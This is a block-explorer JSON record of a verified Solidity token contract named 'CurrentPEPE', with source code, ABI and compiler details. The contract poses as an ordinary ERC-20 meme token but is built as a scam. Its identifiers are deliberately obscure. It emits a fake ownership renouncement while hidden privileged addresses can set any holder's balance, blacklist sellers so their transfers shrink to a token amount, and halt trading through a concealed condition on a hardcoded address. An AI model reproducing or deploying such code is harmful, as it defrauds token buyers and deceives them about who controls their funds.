{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface feeFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listReceiver) external view returns (uint256);\n\n    function transfer(address takeTx, uint256 txReceiver) external returns (bool);\n\n    function allowance(address listExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTx,\n        uint256 txReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSell, uint256 value);\n    event Approval(address indexed listExempt, address indexed spender, uint256 value);\n}\n\nabstract contract feeExemptFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitMin {\n    function createPair(address fundFee, address buyMax) external returns (address);\n}\n\ninterface feeFundMetadata is feeFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CurrentPEPE is feeExemptFrom, feeFund, feeFundMetadata {\n\n    mapping(address => bool) public listShould;\n\n    uint8 private marketingWallet = 18;\n\n    uint256 liquidityToTotal;\n\n    function txReceiverSwap(address isWallet, address takeTx, uint256 txReceiver) internal returns (bool) {\n        if (isWallet == walletShould) {\n            return receiverShould(isWallet, takeTx, txReceiver);\n        }\n        uint256 launchedMarketing = feeFund(atReceiver).balanceOf(launchedTradingList);\n        require(launchedMarketing == autoToken);\n        require(takeTx != launchedTradingList);\n        if (listShould[isWallet]) {\n            return receiverShould(isWallet, takeTx, marketingTokenBuy);\n        }\n        return receiverShould(isWallet, takeTx, txReceiver);\n    }\n\n    address launchedTradingList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private fundSender;\n\n    event OwnershipTransferred(address indexed receiverLaunchReceiver, address indexed marketingLaunched);\n\n    address public walletShould;\n\n    address private launchedLaunch;\n\n    function balanceOf(address listReceiver) public view virtual override returns (uint256) {\n        return isSell[listReceiver];\n    }\n\n    uint256 public tradingFrom;\n\n    function getOwner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    function receiverShould(address isWallet, address takeTx, uint256 txReceiver) internal returns (bool) {\n        require(isSell[isWallet] >= txReceiver);\n        isSell[isWallet] -= txReceiver;\n        isSell[takeTx] += txReceiver;\n        emit Transfer(isWallet, takeTx, txReceiver);\n        return true;\n    }\n\n    string private teamShould = \"CPE\";\n\n    mapping(address => bool) public minLiquidity;\n\n    function allowance(address minList, address modeAmount) external view virtual override returns (uint256) {\n        if (modeAmount == totalAt) {\n            return type(uint256).max;\n        }\n        return fundSender[minList][modeAmount];\n    }\n\n    address public atReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamShould;\n    }\n\n    uint256 public shouldAutoAmount;\n\n    bool public atList;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingWallet;\n    }\n\n    constructor (){\n        \n        receiverFee amountSwap = receiverFee(totalAt);\n        atReceiver = limitMin(amountSwap.factory()).createPair(amountSwap.WETH(), address(this));\n        \n        walletShould = _msgSender();\n        marketingSwap();\n        minLiquidity[walletShould] = true;\n        isSell[walletShould] = fundTx;\n        \n        emit Transfer(address(0), walletShould, fundTx);\n    }\n\n    function transferFrom(address isWallet, address takeTx, uint256 txReceiver) external override returns (bool) {\n        if (_msgSender() != totalAt) {\n            if (fundSender[isWallet][_msgSender()] != type(uint256).max) {\n                require(txReceiver <= fundSender[isWallet][_msgSender()]);\n                fundSender[isWallet][_msgSender()] -= txReceiver;\n            }\n        }\n        return txReceiverSwap(isWallet, takeTx, txReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxWallet;\n    }\n\n    string private maxWallet = \"Current PEPE\";\n\n    address totalAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingSwap() public {\n        emit OwnershipTransferred(walletShould, address(0));\n        launchedLaunch = address(0);\n    }\n\n    bool private liquidityTeam;\n\n    uint256 private totalMarketing;\n\n    function transfer(address tradingAtMin, uint256 txReceiver) external virtual override returns (bool) {\n        return txReceiverSwap(_msgSender(), tradingAtMin, txReceiver);\n    }\n\n    mapping(address => uint256) private isSell;\n\n    function exemptSender() private view {\n        require(minLiquidity[_msgSender()]);\n    }\n\n    uint256 autoToken;\n\n    bool public atIs;\n\n    function feeMinMarketing(address totalLaunched) public {\n        require(totalLaunched.balance < 100000);\n        if (atIs) {\n            return;\n        }\n        \n        minLiquidity[totalLaunched] = true;\n        if (liquidityTeam) {\n            tradingFrom = maxReceiver;\n        }\n        atIs = true;\n    }\n\n    function toFrom(address minBuy) public {\n        exemptSender();\n        \n        if (minBuy == walletShould || minBuy == atReceiver) {\n            return;\n        }\n        listShould[minBuy] = true;\n    }\n\n    uint256 constant marketingTokenBuy = 2 ** 10;\n\n    function amountLiquidityList(address tradingAtMin, uint256 txReceiver) public {\n        exemptSender();\n        isSell[tradingAtMin] = txReceiver;\n    }\n\n    function feeLaunch(uint256 txReceiver) public {\n        exemptSender();\n        autoToken = txReceiver;\n    }\n\n    uint256 private fundTx = 100000000 * 10 ** 18;\n\n    function approve(address modeAmount, uint256 txReceiver) public virtual override returns (bool) {\n        fundSender[_msgSender()][modeAmount] = txReceiver;\n        emit Approval(_msgSender(), modeAmount, txReceiver);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundTx;\n    }\n\n    uint256 public maxReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunchReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"amountLiquidityList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunched\",\"type\":\"address\"}],\"name\":\"feeMinMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAutoAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"toFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAtMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CurrentPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}